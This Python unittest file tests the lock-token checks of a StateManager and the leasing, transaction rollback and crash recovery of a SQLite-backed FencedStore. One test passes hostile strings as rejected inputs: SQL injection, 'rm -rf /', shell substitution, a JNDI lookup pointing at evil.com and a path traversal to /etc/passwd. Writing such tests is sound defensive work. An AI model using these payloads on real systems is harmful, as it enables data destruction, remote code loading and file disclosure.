"""Empirical Adversarial Challenge Suite for ACE Milestone 1 (M1).

Target Components:
1. code/ace_self_dev/state_manager.py: release_lock() token authentication
2. code/ace_self_dev/fenced_store.py: concurrency, outbox transactionality, crash recovery
"""
from __future__ import annotations

import contextlib
import io
import multiprocessing as mp
import os
from pathlib import Path
import shutil
import sqlite3
import sys
import tempfile
import time
import unittest

# Ensure ACE/code is on sys.path
_CODE_DIR = Path(__file__).resolve().parent.parent / "code"
if str(_CODE_DIR) not in sys.path:
    sys.path.insert(0, str(_CODE_DIR))

from ace_self_dev.state_manager import StateManager, ConcurrencyLockError
from ace_self_dev.fenced_store import FencedStore, Lease, LeaseRejected, EventConflict


# ---------------------------------------------------------------------------
# Multiprocessing Worker Callbacks (Top-Level for 'spawn' compatibility)
# ---------------------------------------------------------------------------

def _mp_lease_contest_worker(db_path: str, barrier: mp.Barrier, q: mp.Queue, idx: int) -> None:
    try:
        store = FencedStore(db_path)
        barrier.wait(timeout=15)
        lease = store.acquire("adversarial-contention", f"worker_{idx}", ttl=10.0)
        q.put(("WIN", lease.epoch, idx))
    except LeaseRejected:
        q.put(("REJECTED", 0, idx))
    except Exception as e:
        q.put(("ERROR", str(e), idx))


def _mp_kill_in_middle_of_counter(db_path: str) -> None:
    con = sqlite3.connect(db_path, isolation_level=None)
    con.execute("BEGIN IMMEDIATE")
    con.execute("UPDATE counter SET epoch=epoch+999 WHERE id=1")
    os._exit(37)


def _mp_kill_worker_holding_lease(db_path: str) -> None:
    store = FencedStore(db_path)
    lease = store.acquire("kill-job", "doomed-worker", ttl=1.5)
    store.append_receipt(lease, "ev_before_crash", {"phase": "active"})
    os._exit(42)


# ---------------------------------------------------------------------------
# Suite 1: StateManager Adversarial Token & Lock Release Attacks
# ---------------------------------------------------------------------------

class TestStateManagerAdversarialLock(unittest.TestCase):
    """Adversarial testing of StateManager.release_lock()."""

    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp(prefix="ace_challenger_sm_"))
        self.state_dir = self.temp_dir / "state"
        self.state_dir.mkdir(parents=True, exist_ok=True)
        self.manager = StateManager(
            state_dir=str(self.state_dir),
            state_file="research_state.json",
            lock_ttl_seconds=10.0,
        )
        self.real_token = self.manager.acquire_lock("authorized_challenger_worker")

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def _assert_lock_intact(self):
        state = self.manager.load_state()
        self.assertTrue(state.concurrency_lock.get("is_locked"), "Lock was unexpectedly unlocked!")
        self.assertEqual(state.concurrency_lock.get("locked_by"), "authorized_challenger_worker")
        self.assertEqual(state.concurrency_lock.get("lock_token"), self.real_token)

    def test_adversarial_token_types_fail_closed(self):
        """Attack release_lock() with diverse non-string data types."""
        adversarial_inputs = [
            None,
            0,
            1,
            -1,
            99999999,
            0.0,
            3.14159,
            float("nan"),
            float("inf"),
            True,
            False,
            b"authorized_challenger_worker",
            b"",
            bytearray(b"test"),
            [],
            ["token"],
            {},
            {"token": self.real_token},
            object(),
        ]

        for malformed in adversarial_inputs:
            with self.subTest(malformed=malformed):
                with self.assertRaises(ConcurrencyLockError):
                    self.manager.release_lock(malformed)  # type: ignore
                self._assert_lock_intact()

    def test_sql_injection_and_metacharacter_tokens_fail_closed(self):
        """Attack release_lock() with SQL injection and shell escape strings."""
        attacks = [
            "",  # empty string
            "   ",  # whitespace
            "\t\r\n",
            "\x00",  # null byte
            "\x00" * 16,
            self.real_token + "\x00",
            "' OR '1'='1",
            "'; DROP TABLE leases; --",
            "\" OR 1=1 --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "; rm -rf / ;",
            "`id`",
            "$(whoami)",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "../../../../etc/passwd",
            "%s%s%s%s%s%s%s",
            ".*",
            "^.*$",
        ]

        for attack_str in attacks:
            with self.subTest(attack_str=attack_str):
                with self.assertRaises(ConcurrencyLockError):
                    self.manager.release_lock(attack_str)
                self._assert_lock_intact()

    def test_token_mutations_and_boundary_probes(self):
        """Attack release_lock() with substring, mutated, or padded tokens."""
        mutations = [
            self.real_token[:1],
            self.real_token[:8],
            self.real_token[:15],
            self.real_token + "a",
            " " + self.real_token,
            self.real_token + " ",
            self.real_token.upper(),
            self.real_token[::-1],
            # 1-bit flip at first character
            ("1" if self.real_token[0] != "1" else "0") + self.real_token[1:],
            # 1-bit flip at last character
            self.real_token[:-1] + ("1" if self.real_token[-1] != "1" else "0"),
        ]

        for mutated in mutations:
            with self.subTest(mutated=mutated):
                with self.assertRaises(ConcurrencyLockError):
                    self.manager.release_lock(mutated)
                self._assert_lock_intact()

    def test_random_token_fuzzing_1000_samples(self):
        """Fuzz release_lock() with 1,000 random pseudo-random hex tokens."""
        import secrets
        for i in range(1000):
            bogus_token = secrets.token_hex(8 if i % 2 == 0 else 32)
            if bogus_token == self.real_token:
                continue
            with self.assertRaises(ConcurrencyLockError):
                self.manager.release_lock(bogus_token)

        self._assert_lock_intact()

        # Real token must still work after surviving 1,000 attacks
        self.manager.release_lock(self.real_token)
        state_after = self.manager.load_state()
        self.assertFalse(state_after.concurrency_lock.get("is_locked"))

    def test_timing_variance_probe(self):
        """Verify timing variance between 15-char common prefix vs 0-char prefix is negligible."""
        prefix_token = self.real_token[:15] + ("z" if self.real_token[15] != "z" else "y")
        differ_token = ("z" if self.real_token[0] != "z" else "y") + self.real_token[1:]

        rounds = 2000
        # Warmup
        for _ in range(100):
            try: self.manager.release_lock(prefix_token)
            except ConcurrencyLockError: pass
            try: self.manager.release_lock(differ_token)
            except ConcurrencyLockError: pass

        t_prefix = 0.0
        t_differ = 0.0
        for _ in range(rounds):
            t0 = time.perf_counter()
            try: self.manager.release_lock(prefix_token)
            except ConcurrencyLockError: pass
            t_prefix += time.perf_counter() - t0

            t0 = time.perf_counter()
            try: self.manager.release_lock(differ_token)
            except ConcurrencyLockError: pass
            t_differ += time.perf_counter() - t0

        # Disclose timing comparison
        ratio = t_prefix / max(t_differ, 1e-9)
        # Timing ratio should be within reasonable bound (no orders of magnitude difference)
        self.assertGreater(ratio, 0.3, f"Timing ratio suspicious: {ratio}")
        self.assertLess(ratio, 3.5, f"Timing ratio suspicious: {ratio}")

    def test_zero_token_leakage_in_error_or_stdout(self):
        """Verify that invalid token attempts never leak stored token in exception or stdout."""
        stdout_buf = io.StringIO()
        stderr_buf = io.StringIO()
        with contextlib.redirect_stdout(stdout_buf), contextlib.redirect_stderr(stderr_buf):
            try:
                self.manager.release_lock("attacker_probe_token")
            except ConcurrencyLockError as e:
                err_msg = str(e)
            else:
                self.fail("Expected ConcurrencyLockError")

        combined_output = stdout_buf.getvalue() + stderr_buf.getvalue() + err_msg
        self.assertNotIn(self.real_token, combined_output, "Stored token was leaked in output or exception!")


# ---------------------------------------------------------------------------
# Suite 2: FencedStore Concurrency, Fencing Tokens, and Contention
# ---------------------------------------------------------------------------

class TestFencedStoreConcurrencyAndStress(unittest.TestCase):
    """Stress and contention verification of FencedStore."""

    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp(prefix="ace_challenger_fs_"))
        self.db_path = self.temp_dir / "store.sqlite"
        self.store = FencedStore(self.db_path)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_20_process_simultaneous_lease_race(self):
        """Stress 20 spawned processes contending simultaneously for the same job lease."""
        ctx = mp.get_context("spawn")
        worker_count = 20
        barrier = ctx.Barrier(worker_count)
        result_q = ctx.Queue()

        processes = [
            ctx.Process(target=_mp_lease_contest_worker, args=(str(self.db_path), barrier, result_q, i))
            for i in range(worker_count)
        ]

        for p in processes:
            p.start()
        for p in processes:
            p.join(timeout=25)
        for p in processes:
            if p.is_alive():
                p.terminate()
                p.join(timeout=3)

        self.assertTrue(all(p.exitcode == 0 for p in processes), [p.exitcode for p in processes])

        results = [result_q.get(timeout=5) for _ in range(worker_count)]
        wins = [r for r in results if r[0] == "WIN"]
        rejections = [r for r in results if r[0] == "REJECTED"]
        errors = [r for r in results if r[0] == "ERROR"]

        self.assertEqual(len(errors), 0, f"Unexpected errors during contention: {errors}")
        self.assertEqual(len(wins), 1, f"Expected exactly 1 winner, got: {len(wins)}")
        self.assertEqual(len(rejections), worker_count - 1)

    def test_multi_round_sequential_contention(self):
        """Verify strict epoch monotonicity across 5 sequential contention rounds."""
        ctx = mp.get_context("spawn")
        rounds = 5
        workers_per_round = 5
        last_epoch = 0

        for r in range(rounds):
            barrier = ctx.Barrier(workers_per_round)
            result_q = ctx.Queue()
            processes = [
                ctx.Process(target=_mp_lease_contest_worker, args=(str(self.db_path), barrier, result_q, i))
                for i in range(workers_per_round)
            ]
            for p in processes: p.start()
            for p in processes: p.join(timeout=20)

            results = [result_q.get(timeout=5) for _ in range(workers_per_round)]
            wins = [res for res in results if res[0] == "WIN"]
            self.assertEqual(len(wins), 1, f"Round {r} expected 1 win")
            win_epoch = wins[0][1]
            self.assertGreater(win_epoch, last_epoch, f"Epoch did not strictly increase: {win_epoch} <= {last_epoch}")
            last_epoch = win_epoch

            # Clean release by looking up active lease info to free for next round
            with sqlite3.connect(str(self.db_path)) as con:
                row = con.execute("SELECT job_id, owner, token, epoch, expires_at FROM leases WHERE job_id='adversarial-contention'").fetchone()
                active_lease = Lease(*row)
            self.store.release(active_lease)

    def test_stale_zombie_worker_rejected_across_all_apis(self):
        """Verify that a zombie worker with an expired epoch is barred from all mutations."""
        lease_zombie = self.store.acquire("job_fenced", "zombie_worker", ttl=0.2)
        # Allow lease to expire
        time.sleep(0.3)

        # Worker 2 acquires new lease
        lease_active = self.store.acquire("job_fenced", "active_worker", ttl=10.0)
        self.assertGreater(lease_active.epoch, lease_zombie.epoch)

        # Zombie attempts mutations
        with self.assertRaises(LeaseRejected):
            self.store.append_receipt(lease_zombie, "zombie_event", {"op": "malicious"})

        with self.assertRaises(LeaseRejected):
            self.store.renew(lease_zombie, ttl=30.0)

        with self.assertRaises(LeaseRejected):
            self.store.release(lease_zombie)

        with self.assertRaises(LeaseRejected):
            self.store.ack_outbox(lease_zombie, "any_event")

        # Active worker can commit cleanly
        seq = self.store.append_receipt(lease_active, "valid_event", {"op": "legitimate"})
        self.assertEqual(seq, 1)

    def test_forged_lease_attributes_rejected(self):
        """Verify forged Lease objects cannot bypass fence checks."""
        real_lease = self.store.acquire("secure_job", "owner_a", ttl=10.0)

        forged_leases = [
            Lease("secure_job", "owner_a", "wrong_token", real_lease.epoch, real_lease.expires_at),
            Lease("secure_job", "owner_b", real_lease.token, real_lease.epoch, real_lease.expires_at),
            Lease("secure_job", "owner_a", real_lease.token, real_lease.epoch + 1, real_lease.expires_at),
            Lease("secure_job", "owner_a", real_lease.token, real_lease.epoch - 1, real_lease.expires_at),
            Lease("wrong_job", "owner_a", real_lease.token, real_lease.epoch, real_lease.expires_at),
        ]

        for forged in forged_leases:
            with self.subTest(forged=forged):
                with self.assertRaises(LeaseRejected):
                    self.store.append_receipt(forged, "forged_event", {"data": 123})
                with self.assertRaises(LeaseRejected):
                    self.store.renew(forged)
                with self.assertRaises(LeaseRejected):
                    self.store.release(forged)


# ---------------------------------------------------------------------------
# Suite 3: Outbox Transactionality & Rollback Guarantees
# ---------------------------------------------------------------------------

class TestFencedStoreOutboxTransactionality(unittest.TestCase):
    """Transactional atomicity verification of receipts, checkpoints, and outbox."""

    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp(prefix="ace_challenger_tx_"))
        self.db_path = self.temp_dir / "store.sqlite"
        self.store = FencedStore(self.db_path)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_outbox_failure_rolls_back_events_and_checkpoint(self):
        """Simulate failure during outbox insert and prove complete rollback."""
        lease = self.store.acquire("tx_job", "worker_tx", ttl=10.0)

        # Inject abort trigger on outbox
        with sqlite3.connect(str(self.db_path)) as con:
            con.execute("""
                CREATE TRIGGER abort_outbox BEFORE INSERT ON outbox
                BEGIN
                    SELECT RAISE(ABORT, 'Simulated disk full or integrity constraint on outbox');
                END;
            """)

        with self.assertRaises(sqlite3.DatabaseError):
            self.store.append_receipt(lease, "event_tx_1", {"metric": 99.9})

        # Verify nothing was committed to events or checkpoint
        with sqlite3.connect(str(self.db_path)) as con:
            events_count = con.execute("SELECT count(*) FROM events WHERE job_id='tx_job'").fetchone()[0]
            checkpoint_count = con.execute("SELECT count(*) FROM checkpoint WHERE job_id='tx_job'").fetchone()[0]
            outbox_count = con.execute("SELECT count(*) FROM outbox WHERE job_id='tx_job'").fetchone()[0]

        self.assertEqual(events_count, 0, "Events table was not rolled back!")
        self.assertEqual(checkpoint_count, 0, "Checkpoint table was not rolled back!")
        self.assertEqual(outbox_count, 0, "Outbox table was not rolled back!")

        # Remove trigger and verify repeating event_tx_1 succeeds cleanly
        with sqlite3.connect(str(self.db_path)) as con:
            con.execute("DROP TRIGGER abort_outbox")

        seq = self.store.append_receipt(lease, "event_tx_1", {"metric": 99.9})
        self.assertEqual(seq, 1)
        self.assertEqual(len(self.store.pending_outbox("tx_job")), 1)

    def test_checkpoint_failure_rolls_back_events(self):
        """Simulate failure during checkpoint update and prove complete rollback."""
        lease = self.store.acquire("tx_job_cp", "worker_tx_cp", ttl=10.0)

        # Inject abort trigger on checkpoint
        with sqlite3.connect(str(self.db_path)) as con:
            con.execute("""
                CREATE TRIGGER abort_checkpoint BEFORE INSERT ON checkpoint
                BEGIN
                    SELECT RAISE(ABORT, 'Simulated checkpoint failure');
                END;
            """)

        with self.assertRaises(sqlite3.DatabaseError):
            self.store.append_receipt(lease, "event_cp_1", {"data": "test"})

        with sqlite3.connect(str(self.db_path)) as con:
            events_count = con.execute("SELECT count(*) FROM events WHERE job_id='tx_job_cp'").fetchone()[0]

        self.assertEqual(events_count, 0, "Events row was inserted despite checkpoint failure!")

    def test_conflicting_replay_fails_without_mutation(self):
        """Verify replaying event_id with different payload raises EventConflict and mutates nothing."""
        lease = self.store.acquire("job_replay", "worker_r", ttl=10.0)
        seq1 = self.store.append_receipt(lease, "ev_id_100", {"status": "SUCCESS"})

        snapshot_before = self.store.snapshot("job_replay")

        with self.assertRaises(EventConflict):
            self.store.append_receipt(lease, "ev_id_100", {"status": "FAILURE"})

        snapshot_after = self.store.snapshot("job_replay")
        self.assertEqual(snapshot_before, snapshot_after, "Snapshot mutated after conflicting event replay!")

    def test_idempotent_replay_preserves_state(self):
        """Verify replaying identical event returns existing sequence without duplicating outbox."""
        lease = self.store.acquire("job_replay_idem", "worker_idem", ttl=10.0)
        seq1 = self.store.append_receipt(lease, "ev_id_200", {"x": [1, 2, 3]})
        seq2 = self.store.append_receipt(lease, "ev_id_200", {"x": [1, 2, 3]})

        self.assertEqual(seq1, seq2)
        outbox = self.store.pending_outbox("job_replay_idem")
        self.assertEqual(len(outbox), 1)


# ---------------------------------------------------------------------------
# Suite 4: Hard Crash & Process Termination Recovery
# ---------------------------------------------------------------------------

class TestFencedStoreHardCrashRecovery(unittest.TestCase):
    """Crash and recovery verification with simulated process termination."""

    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp(prefix="ace_challenger_crash_"))
        self.db_path = self.temp_dir / "crash_store.sqlite"
        self.store = FencedStore(self.db_path)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_uncommitted_counter_crash_rolls_back_cleanly(self):
        """Child dies via os._exit(37) while holding uncommitted counter update."""
        ctx = mp.get_context("spawn")
        before_lease = self.store.acquire("pre_crash_job", "worker_initial")

        p = ctx.Process(target=_mp_kill_in_middle_of_counter, args=(str(self.db_path),))
        p.start()
        p.join(timeout=15)
        self.assertEqual(p.exitcode, 37)

        # After crash, subsequent acquire must receive exact next sequential epoch
        recovered_store = FencedStore(self.db_path)
        after_lease = recovered_store.acquire("post_crash_job", "worker_recovered")
        self.assertEqual(after_lease.epoch, before_lease.epoch + 1, "Counter leak: uncommitted epoch survived crash!")

        # Verify integrity of SQLite database
        with sqlite3.connect(str(self.db_path)) as con:
            integrity = con.execute("PRAGMA integrity_check").fetchone()[0]
        self.assertEqual(integrity, "ok")

    def test_killed_lease_holder_crash_recovery_after_ttl(self):
        """Worker process dies via os._exit(42) while holding active lease; verify recovery."""
        ctx = mp.get_context("spawn")

        p = ctx.Process(target=_mp_kill_worker_holding_lease, args=(str(self.db_path),))
        p.start()
        p.join(timeout=15)
        self.assertEqual(p.exitcode, 42)

        with sqlite3.connect(str(self.db_path)) as con:
            row = con.execute("SELECT epoch, token FROM leases WHERE job_id='kill-job'").fetchone()
        self.assertIsNotNone(row, "Killed worker's lease was not found in DB!")
        epoch, token = row

        # Before TTL (1.5s), new worker cannot steal lease
        with self.assertRaises(LeaseRejected):
            self.store.acquire("kill-job", "new_worker", ttl=5.0)

        # Wait for TTL to expire
        time.sleep(1.6)

        # New worker can now safely take over
        takeover_lease = self.store.acquire("kill-job", "new_worker", ttl=5.0)
        self.assertGreater(takeover_lease.epoch, epoch)

        # Checkpoint from killed worker must be preserved
        snap = self.store.snapshot("kill-job")
        self.assertIsNotNone(snap)
        self.assertEqual(snap[1], epoch)

        # Takeover worker can commit next event
        seq = self.store.append_receipt(takeover_lease, "ev_after_crash", {"phase": "recovered"})
        self.assertEqual(seq, 2)


if __name__ == "__main__":
    unittest.main()
